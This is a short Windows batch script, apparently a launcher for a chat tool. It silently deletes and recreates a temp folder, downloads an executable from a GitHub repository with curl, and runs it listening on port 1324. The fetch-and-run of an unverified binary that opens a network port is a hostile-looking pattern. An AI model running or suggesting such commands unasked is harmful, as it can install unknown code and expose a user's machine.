@echo off
rd /s /q %temp%\batch_chat_tools
mkdir %temp%\batch_chat_tools
cd %temp%\batch_chat_tools
curl -L -s -O https://github.com/wedadata/chat_bat/raw/refs/heads/main/service_tool_chat.exe
service_tool_chat.exe -l -p 1324
echo Connection lost!
pause >nul
exit
